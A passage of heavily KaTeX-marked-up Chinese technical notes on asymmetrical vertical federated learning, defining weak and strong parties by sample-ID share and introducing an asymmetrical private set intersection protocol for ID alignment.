class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0352em;"></span><span class="mord"><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3052em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p>如果上面的条件成立，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 可称为<code>弱方</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 称为<code>强方</code>。<br>分析：由上面的条件可以得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow></mfrac><mo>&lt;</mo><mn>1</mn><msup><mn>0</mn><mfrac><mn>1</mn><mn>2</mn></mfrac></msup><mo>≈</mo><mn>0.316</mn></mrow><annotation encoding="application/x-tex">\frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;10^{\frac{1}{2}}\approx 0.316</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.5552em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.954em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.316</span></span></span></span>，即样本数量占比低于0.316的为弱方。</p><p>以上的分析都是两方的，事实上，通过非对称保护弱方的样本ID隐私，可以将分析简单扩展到多方案例。</p></li></ol><h1 id="Asymmetrical-ID-Alignment">Asymmetrical ID Alignment</h1><p>ID对齐是纵向联邦学习工作流的第一步。本节中，我们采用标准PSI协议以实现非对称ID对齐，并提供了一种使用传统密码学的实现方法。</p><h2 id="Asymmetrical-PSI-Protocols">Asymmetrical PSI Protocols</h2><p>在SVFL的样本对齐阶段，标准PSI协议的执行不仅让各方获得共有样本的知识，还提供了一个标签，可以有效地将分布式样本片段链接在一起，为后续的联邦学习铺平道路。而在AVFL中，为了正确实现样本对齐，必须采取满足如下条件的标准PSI协议：</p><ol><li>真实交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对强参与方保密</li><li>在联邦模型训练阶段， <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对应的分布式样本仍然可以对齐</li></ol><p>使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>w</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{w}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> 分别表示待ID对齐的弱方和强方的样本ID集合，二者定义如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mi>w</mi><mi>o</mi></msubsup><mo fence="true">}</mo></mrow><mo>=</mo><mi><munder><mo><mi mathvariant="normal">argmin</mi><mo>⁡</mo></mo><mrow><mi mathvariant="script">I</mi><mo>∈</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">}</mo></mrow></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="script">I</mi><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup><mo fence="true">}</mo></mrow><mo>=</mo><mi><munder><mo><mi mathvariant="normal">argmax</mi><mo>⁡</mo></mo><mrow><mi mathvariant="script">I</mi><mo>∈</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">}</mo></mrow></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="script">I</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\left\{\mathcal{I}_{w}^{o}\right\}=\underset{\mathcal{I} \in\left\{\mathcal{I}_{1}^{o}, \mathcal{I}_{2}^{o}\right\}}{\operatorname{argmin}}|\mathcal{I}|,\left\{\mathcal{I}_{s}^{o}\right\}=\underset{\mathcal{I} \in\left\{\mathcal{I}_{1}^{o}, \mathcal{I}_{2}^{o}\right\}}{\operatorname{argmax}}|\mathcal{I}| .</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.2104em;vertical-align:-1.4604em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-1.9421em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="mrel mtight">∈</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">{</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">}</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">argmin</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4604em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.2104em;vertical-align:-1.4604em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-1.9421em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="mrel mtight">∈</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">{</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">}</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">argmax</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4604em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mord">∣.</span></span></span></span></span></p><p><strong>定义2</strong>：非对称PSI（Asymmetrical PSI，APSI）协议会在双方产生一个扰动集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>⊂</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{o b f} \subset \mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8882em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> ，满足：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo>⊂</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>⊂</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{1}=\mathcal{I}_{2} \subset \mathcal{I}^{o b f} \subset \mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" 